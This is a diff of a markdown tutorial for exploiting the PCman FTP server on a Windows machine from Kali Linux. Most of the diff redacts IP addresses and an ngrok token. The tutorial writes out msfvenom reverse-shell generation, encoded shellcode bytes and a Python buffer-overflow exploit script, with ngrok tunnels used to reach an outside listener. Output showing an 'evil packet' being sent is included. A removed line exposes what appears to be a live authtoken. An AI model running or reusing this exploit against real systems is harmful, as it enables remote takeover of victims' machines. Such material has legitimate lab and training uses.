@@ -59,32 +59,32 @@ COMMANDS:
    version      print the version string
    help         Shows a list of commands or help for one command
 ```
-The Ngrok wellcome screen... in order to create a ftp (21) service in ngrok just type
-```sh
-ngrok tcp 21
---------------------------------------------------------------------------------
-If you have already signed up, make sure your authtoken is installed.
-Your authtoken is available on your dashboard: https://dashboard.ngrok.com/auth/your-authtoken
-```
-Log in ngrok and copy the authtoken (you can use a temporary email service as Temp Mail - temp-mail.org)
 
-paste your authtoken using the follow command 
+This is the welcome screen of Ngrok ... to create an ftp on port (21) you must be registered with ngrok, copy the authtoken (you can use a temporary email service like Temp Mail - temp-mail.org to achieve this objective)
+
+Paste your authtoken using the following command
+
 ```sh
-./ngrok authtoken "*****************************************"
+ngrok authtoken "*****************************************"
 ngrok by @inconshreveable                                                                               (Ctrl+C to quit)                                                                                                                        Session Status                online                                                                                    Account                       tester (Plan: Free)                                                                       Version                       2.3.35                                                                                    Region                        United States (us)                                                                        Web Interface                 http://127.0.0.1:4040                                                                     Forwarding                    tcp://xxxxxxxxxxx.io:xxxxx -> localhost:21                                                                                                                                                                        Connections                   ttl     opn     rt1     rt5     p50     p90                                                                             0       0       0.00    0.00    0.00    0.00  
 ```
-We open netcat to lisen on port 21, go to your netcat location and run it with the next command
+Create a ftp service in ngrok just typing
+```sh
+ngrok tcp 21
+```
+We open can also open netcat to lisen on port 21 on windows machine, go to your netcat location and run it with the next command
 ```sh
 nc -l -p 21
 ```
 Check if netcat service is lisening at port 21.
+---
 
 Now it's time to open the vulnerable app on windows and start the kali machine to set it up as attacking machine.
 Install ngrok for linux on the kali machine. 
 
-Create a new authtoken for ngrok, paste and run these commands:
+Create a new authtoken for ngrok, paste it and choose a port number, then run these commands
 sh````
-./ngrok authtoken 1nBkEGfhS0wi7S7UVGrmk93XSzu_45cNBsHJus9vMriC9k7Jw
+./ngrok authtoken XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 ./ngrok tcp 2021
 ```
 ping to forwarding address
@@ -92,9 +92,9 @@ sh```
 ping 2.tcp.ngrok.io
 ---
 obtaining the remote ip address (*.*.*.*)
-Create a reverse shell with metaexplot msvenom with the following command
+Create a reverse shell with metasploit msfvenom with the following command adding the LHOST ip and the LPORT port number.
 ```sh
-$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=3.131.207.170 LPORT=11954  -f python
+$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=X.XXX.XX.XXX LPORT=XXXXX  -f python
 ```
 Ensure IP and port values are both correct
 ```sh
@@ -162,18 +162,18 @@ buf += b"\x57\x32\x33\x44\x32\x42\x4f\x71\x7a\x43\x30\x51\x43"
 buf += b"\x79\x6f\x68\x55\x41\x41"
 
 ```
-now we can open a listener on port 2021 just typing 
+now we can open a listener on port 2021 just typing on terminal.
 ```sh
 nc -lvp 2021
 ```
 ---
 
-## The base python script (Master Dreg)
+## The base python script (by Master Dreg)
 
-add target_ip, port number and shell script to our base python script. To achieve our intentions we should make a ping of the windows machine 
+add target ip, port number and shell script to our base python script. To achieve our malicious intentions we should make a ping of the windows machine
 ```sh
 $ ping 0.tcp.ngrok.io
-PING 0.tcp.ngrok.io (3.134.39.220) 56(84) bytes of data.
+PING 0.tcp.ngrok.io (X.XXX.XX.XXX) 56(84) bytes of data.
 ^C
 --- 0.tcp.ngrok.io ping statistics ---
 5 packets transmitted, 0 received, 100% packet loss, time 4082ms
@@ -196,8 +196,8 @@ print ("-") *40
 os.system("ifconfig eth0 mtu 3000")
 
 # tcp://0.tcp.ngrok.io:14087 -> localhost:21
-target_ip = "3.134.39.220" # Remote machine IP
-port = int(15139) #ngrok remote machine
+target_ip = "X.XXX.XX.XXX" # Remote machine IP
+port = int(XXXXX) #ngrok remote machine
 
 # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=3.22.53.161 LPORT=11954  -f python
 buf =  b""
@@ -314,7 +314,8 @@ print("\n\nDone! :-)\n")
 
 sleep(1)
 ```
-Ensure PCman is runing on windows machine and launch the script in kali, if everithing is working we shoul have now access to the remote windows machine! look on port 2021.
+Ensure PCman is running on windows machine and launch the script in your kali, if everything is working we should have now access to our remote windows machine! look on port 2021.
+
 ```sh
 └─$ python pcman_dregmod_exploit_two.py                                                                                                      1 ⨯
 ----------------------------------------
@@ -339,7 +340,7 @@ Logging as anonymous
 Empty password
 230 User logged in
 
-Sending evil packet to 3.134.39.220 15139 (length: 2743 bytes), please wait a few secs....
+Sending evil packet to X.XXX.XX.XXX 15139 (length: 2743 bytes), please wait a few secs....
 
 
 Done! :-)
